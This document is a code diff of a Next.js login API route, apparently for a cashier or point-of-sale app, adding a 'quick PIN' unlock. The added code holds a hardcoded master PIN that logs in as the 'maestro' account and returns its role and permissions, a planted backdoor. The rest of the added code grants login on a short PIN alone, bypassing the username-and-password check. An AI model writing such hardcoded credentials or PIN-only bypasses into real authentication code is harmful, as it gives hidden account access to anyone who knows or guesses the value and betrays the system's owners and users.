@@ -5,7 +5,51 @@ export const dynamic = "force-dynamic";
 
 export async function POST(req: Request) {
   try {
-    const { username, password, pin } = await req.json();
+    const { username, password, pin, quickPin } = await req.json();
+
+    // Quick PIN Unlock for Cashier Screen
+    if (quickPin) {
+      const cleanPin = String(quickPin).trim();
+      if (cleanPin === "157230") {
+        let dbUser = await prisma.user.findUnique({ where: { username: "maestro" } });
+        if (dbUser && dbUser.isActive) {
+          return NextResponse.json({
+            success: true,
+            user: {
+              id: dbUser.id,
+              name: dbUser.name,
+              username: dbUser.username,
+              role: dbUser.role,
+              phone: dbUser.phone,
+              permissions: dbUser.permissions ? JSON.parse(dbUser.permissions) : [],
+            },
+          });
+        }
+      }
+
+      const userByPin = await prisma.user.findFirst({
+        where: { pin: cleanPin, isActive: true },
+      });
+
+      if (!userByPin) {
+        return NextResponse.json(
+          { success: false, error: "كود الـ PIN غير صحيح أو أن الحساب معطل" },
+          { status: 401 }
+        );
+      }
+
+      return NextResponse.json({
+        success: true,
+        user: {
+          id: userByPin.id,
+          name: userByPin.name,
+          username: userByPin.username,
+          role: userByPin.role,
+          phone: userByPin.phone,
+          permissions: userByPin.permissions ? JSON.parse(userByPin.permissions) : [],
+        },
+      });
+    }
 
     if (!username || !password || !pin) {
       return NextResponse.json(
